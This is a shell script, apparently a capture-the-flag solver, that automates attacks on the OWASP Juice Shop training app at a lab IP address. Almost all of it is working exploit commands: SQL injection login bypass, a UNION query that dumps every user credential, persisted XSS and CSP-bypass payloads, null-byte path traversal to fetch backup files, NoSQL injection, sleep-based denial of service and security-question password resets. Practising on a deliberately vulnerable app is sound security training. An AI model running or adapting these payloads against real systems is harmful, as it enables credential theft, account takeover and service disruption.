#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.87.170"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null


# Initiate session and cookies
echo "4.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/4-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/4-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/4-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/4-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/4-cookies.txt

# Gain access to any access log file of the server.
echo "4.1 - ACCESS LOG"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/4-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/4-admin.json
ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/4-admin.json)
BASKET_ID=$(jq -r '.authentication.bid' $result_folder/4-admin.json)
echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
cp $result_folder/4-cookies.txt $result_folder/4-admin-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ADMIN_TOKEN" >> $result_folder/4-admin-cookies.txt
TODAY=$(date +%Y-%m-%d)
curl -s -X GET "http://$target_ip/support/logs/access.log.$TODAY" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-access-logs.json

# Bypass the Content Security Policy and perform an XSS attack with <script>alert(`xss`)</script> on a legacy page within the application. 
echo "4.2 - CSP BYPASS"
curl -s -X POST "http://$target_ip/profile" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: Bearer ${ADMIN_TOKEN}" -d "username=</p><<script>sscript>alert(%60xss%60)</script><p>" -o /dev/null
curl -s -X POST "http://$target_ip/profile/image/url" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -H "Authorization: Bearer ${ADMIN_TOKEN}" -d "imageUrl=http://placekittens.com/200/300;%20script-src%20'unsafe-inline'" -o /dev/null
node $scriptpath/../../tools/playwright.js "http://$target_ip/profile" $result_folder/4-admin-cookies.txt > $result_folder/4-profile.html 2>/dev/null

# Order the Christmas special offer of 2014.
echo "4.3 - CHRISTMAS SPECIAL"
curl -s -X GET "http://$target_ip/rest/products/search?q=christmas%25%27%29%29--" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-christmas.json
CHRISTMAS_ID=$(jq -r '.data[0].id' $result_folder/4-christmas.json)
echo "--> Christmas special id $CHRISTMAS_ID"
curl -s -X POST "http://$target_ip/api/BasketItems/" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"ProductId\":$CHRISTMAS_ID,\"BasketId\":\"$BASKET_ID\",\"quantity\":1}" -o /dev/null
curl -s -X POST "http://$target_ip/rest/basket/$BASKET_ID/checkout" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -d "{\"couponData\":\"bnVsbA==\",\"orderDetails\":{\"paymentId\":\"wallet\",\"addressId\":\"7\",\"deliveryMethodId\":\"1\"}}" -o /dev/null

# Find the hidden easter egg.
echo "4.4 - EASTER EGG"
curl -s -X GET "http://$target_ip/ftp/eastere.gg%2500.md" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-easteregg.txt

# Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.
echo "4.5 - EPHEMERAL ACCOUNTANT"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/4-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"' UNION SELECT * FROM (SELECT 15 as 'id', 'mwahaha' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', 'mwahaha' as 'password', 'accounting' as 'role', '' as 'deluxeToken', '0.0.0.0' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '2024-12-15 00:00:00.000 +00:00' as 'createdAt', '2024-12-15 00:00:00.000 +00:00' as 'updatedAt', NULL as 'deletedAt')--\",\"password\":\"a\"}" -o $result_folder/4-accountant.json
ACCOUNTANT_TOKEN=$(jq -r '.authentication.token' $result_folder/4-accountant.json)
echo "--> Authenticated as accountant with token $(echo "$ACCOUNTANT_TOKEN" | cut -c 1-20)...."
cp $result_folder/4-cookies.txt $result_folder/4-accountant-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ACCOUNTANT_TOKEN" >> $result_folder/4-accountant-cookies.txt
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/" $result_folder/4-accountant-cookies.txt > $result_folder/4-accountant.html 2>/dev/null

# Successfully redeem an expired campaign coupon code
echo "4.6 - EXPIRED COUPON"
# This one is difficult to automate. Some campaigns coupons are directly managed in client-side. One of them is ORANGE2023 valid on the 4th of May 2023, 11:00PM.
# Changing the client date to this date before submotting coupon will result in a valid discount and solve the challenge. But since everything happens client-side
# It would require a tool like selenium to automate coupon redeem.


# Access a salesman's forgotten backup file
echo "4.7 - FORGOTTEN DEVELOPER BACKUP"
curl -s -X GET "http://$target_ip/ftp/package.json.bak%2500.md" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-package.json.bak

# Access a salesman's forgotten backup file
echo "4.8 - FORGOTTEN SALES BACKUP"
curl -s -X GET "http://$target_ip/ftp/coupons_2013.md.bak%2500.md" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-coupons_2013.md.bak

# Steal someone else's personal data without using Injection
echo "4.9 - GPDR DATA THEFT"
curl -s -X POST "http://$target_ip/api/Users/" -b "$result_folder/4-cookies.txt" -L -H "Content-Type: application/json" -o /dev/null -d "{\"email\":\"edmon@juice-sh.op\",\"password\":\"test123\",\"passwordRepeat\":\"test1234\",\"securityQuestion\":{\"id\":4,\"question\":\"Father's birth date? (MM/DD/YY)\",\"createdAt\":\"2024-12-03T13:02:20.334Z\",\"updatedAt\":\"2024-12-03T13:02:20.334Z\"},\"securityAnswer\":\"03/03/03\"}"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/4-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"edmon@juice-sh.op\",\"password\":\"test123\"}" -o $result_folder/4-edmon.json
EDMON_TOKEN=$(jq -r '.authentication.token' $result_folder/4-edmon.json)
echo "--> Authenticated as *dm*n with token $(echo "$EDMON_TOKEN" | cut -c 1-20)...."
cp $result_folder/4-cookies.txt $result_folder/4-edmon-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$EDMON_TOKEN" >> $result_folder/4-edmon-cookies.txt
curl -s -X POST "http://$target_ip/rest/user/data-export" -b "$result_folder/4-edmon-cookies.txt" -H "Authorization: Bearer ${EDMON_TOKEN}" -L -o $result_folder/4-gdpr.json

# Perform a persisted XSS attack through an HTTP header
echo "4.10 - HTTP-HEADER XSS"
curl -s -X GET http://$target_ip/rest/saveLoginIp -H "Authorization: Bearer ${ADMIN_TOKEN}" -H "True-Client-IP: <iframe src=\"javascript:alert(\`xss\`)\">" -L -o $result_folder/4-log-ip.json

# Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous.
echo "4.11 - LEAKED UNSAFE PRODUCT"
curl -s -X POST "http://$target_ip/api/Complaints/" -b "$result_folder/4-admin-cookies.txt" -L -H "Authorization: Bearer ${ADMIN_TOKEN}" -H "Content-Type: application/json" -d "{\"UserId\":1,\"message\":\"hueteroneel and eurogium edule\"}" -o /dev/null

# Inform the shop about a typosquatting trick it has been a victim of at least in v6.2.0-SNAPSHOT. (Mention the exact name of the culprit)
echo "4.12 - LEGACY TYPOSQUATTING"
# Fron the leaked developer file, we get a list of the components. Analyzing one by one using url https://www.npmjs.com/package/epilogue-js, we find the 
# vulnerable component. Then on github, we find the associated commit around version 6.2.0 https://github.com/juice-shop/juice-shop/commit/78c793917c980715c258842fa58b8bf30b517895
curl -s -X POST "http://$target_ip/api/Complaints/" -b "$result_folder/4-admin-cookies.txt" -L -H "Authorization: Bearer ${ADMIN_TOKEN}" -H "Content-Type: application/json" -d "{\"UserId\":1,\"message\":\"epilogue-js bjoern kimminich\"}" -o /dev/null

# Log in with Bjoern's Gmail account without previously changing his password, applying SQL Injection, or hacking his Google account.
echo "4.13 - LOGIN BJOERN"
# Fron the leaked developer file, we get a list of the components. Analyzing one by one using url https://www.npmjs.com/package/epilogue-js, we find the 
# vulnerable component. Then on github, we find the associated commit around version 6.2.0 https://github.com/juice-shop/juice-shop/commit/78c793917c980715c258842fa58b8bf30b517895
PASSWORD=$(echo "moc.liamg@hcinimmik.nreojb" | base64)
echo "--> Bjoern oauth login password is $PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/4-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern.kimminich@gmail.com\",\"password\":\"$PASSWORD=\"}" -o $result_folder/4-bjoern.json

# Access a misplaced SIEM signature file.
echo "4.14 - MISPLACED SIGNATURE FILE"
curl -s -X GET "http://$target_ip/ftp/suspicious_errors.yml%2500.md" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-suspicious_errors.yml

# Apply some advanced cryptanalysis to find the real easter egg.
echo "4.15 - NESTED EASTER EGG"
# From the content of the easter egg file, decode base64, then decypher caesar cipher... so much for advancesd crypto
curl -s -X GET "http://$target_ip/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-real-egg.html

# Let the server sleep for some time. (It has done more than enough hard work for you)
echo "4.16 - NOSQL DOS"
curl -s -X GET "http://$target_ip/rest/products/sleep(2000)/reviews" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o /dev/null

# Let the server sleep for some time. (It has done more than enough hard work for you)
echo "4.16 - NOSQL MANIPULATION"
curl -s -X GET "http://$target_ip/rest/products/1,2/reviews" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-reviews.json
REVIEW_IDS=$(jq -r '.data[:5] | .[] | ._id' $result_folder/4-reviews.json  | sed ':a;N;$!ba;s/\n/","/g')
curl -s -X PATCH "http://$target_ip/rest/products/reviews" -b "$result_folder/4-admin-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer $ADMIN_TOKEN" -L -d "{\"id\":{\"\$in\":[\"$REVIEW_IDS\"]},\"message\":\"mwahaha\"}" -o /dev/null

# Reset Bender's password via the Forgot Password mechanism with the original answer to his security question.
echo "4.18 - RESET BENDER'S PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/4-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bender@juice-sh.op\",\"answer\":\"Stop'n'Drop\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o /dev/null

# Reset Uvogin's password via the Forgot Password mechanism with the original answer to his security question.
echo "4.19 - RESET UVOGIN'S PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/4-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"uvogin@juice-sh.op\",\"answer\":\"Silence of the Lambs\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o /dev/null

# Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism.
echo "4.20 - SERVER-SIDE XSS PROTECTION"
curl -s -X GET http://$target_ip/rest/user/whoami -b "$result_folder/4-admin-cookies.txt" -L -o $result_folder/4-user.json
USER_ID=$(jq -r '.user.id' $result_folder/4-user.json)
echo "--> The user id is $USER_ID"
curl -s -X GET http://$target_ip/rest/captcha -b "$result_folder/4-admin-cookies.txt" -L -o $result_folder/4-captcha.json
CAPTCHA_RESULT=$(jq -r '.answer' $result_folder/4-captcha.json)
CAPTCHA_ID=$(jq -r '.captchaId' $result_folder/4-captcha.json)
echo "--> The captcha $CAPTCHA_ID is $CAPTCHA_RESULT"
curl -s -X POST "http://$target_ip/api/Feedbacks/" -b "$result_folder/4-admin-cookies.txt"  -L -H "Content-Type: application/json" -d "{\"UserId\":$USER_ID,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_RESULT\",\"comment\":\"<<iframe src=\\\"javascript:alert(\`xss\`)\\\">iframe src=\\\"javascript:alert(\`xss\`)\\\">\",\"rating\":0}" -o /dev/null

# Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character)
echo "4.21 - STEGANOGRAPHY"
# From the reference to lorem ipsum, we get that it's something related to the "About Us" page. The images here are blurry enough to hide information easily. Only one of them is in png, which makes it suspect as the creator must have wanted to avoid compressng the image
curl -s -X GET "http://$target_ip/assets/public/images/carousel/5.png" -b "$result_folder/1-admin-cookies.txt" -L -o $result_folder/4-suspicious-image.png
java -jar /usr/local/bin/openstego/lib/openstego.jar extract -sf $result_folder/4-suspicious-image.png -xd $result_folder/ -p ""
mv $result_folder/J7RbRp1D5XDM5LINx0TdgeFX_o.png $result_folder/4-found-character.png
curl -s -X GET http://$target_ip/rest/captcha -b "$result_folder/4-admin-cookies.txt" -L -o $result_folder/4-captcha.json
CAPTCHA_RESULT=$(jq -r '.answer' $result_folder/4-captcha.json)
CAPTCHA_ID=$(jq -r '.captchaId' $result_folder/4-captcha.json)
echo "--> The captcha $CAPTCHA_ID is $CAPTCHA_RESULT"
curl -s -X POST "http://$target_ip/api/Feedbacks/" -b "$result_folder/4-admin-cookies.txt" -L -H "Content-Type: application/json" -H "Authorization: Bearer ${ADMIN_TOKEN}"  -d "{\"UserId\":1,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_RESULT\",\"comment\":\"Pickle Rick\",\"rating\":5}" -o /dev/null

# Retrieve a list of all user credentials via SQL Injection.
echo "4.22 - USER CREDENTIALS"
curl -s -X GET "http://$target_ip/rest/products/search?q=none'))+UNION+SELECT+id,email,password,username,+0+AS+deluxePrice,+''+AS+image,+'2024-12-16'+AS+createdAt,+'2024-12-16'+AS+updatedAt,+NULL+AS+deletedAt+from+Users--" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/4-credentials.json

# Inform the shop about an algorithm or library it should definitely not use the way it does.
echo "4.23 - VULNERABLE LIBRARY"
# Passwords in the SQL database are encoded as md5 hashes, which are easily crackable (found while attempting SQL injection : error messages return passwords)
curl -s -X POST "http://$target_ip/api/Complaints/" -b "$result_folder/4-admin-cookies.txt" -L -H "Authorization: Bearer ${ADMIN_TOKEN}" -H "Content-Type: application/json" -d "{\"UserId\":1,\"message\":\"sanitize-html 1.4.2\"}" -o /dev/null

# Enforce a redirect to a page you are not supposed to redirect to.
echo "4.24 - WHITELIST BYPASS"
# You can add any /../ to the whitelisted url
curl -s -X GET "http://$target_ip/redirect?to=http://localhost:3000/redirect?http://shop.spreadshirt.com/juiceshop" -b "$result_folder/4-admin-cookies.txt" -L -o $result_folder/4-redirect.html

# Compute score
echo "4.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/4-cookies.txt" -L -o $result_folder/4-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 4 and .solved == true)] | length' $result_folder/4-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 4 and .solved != null)] | length' $result_folder/4-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"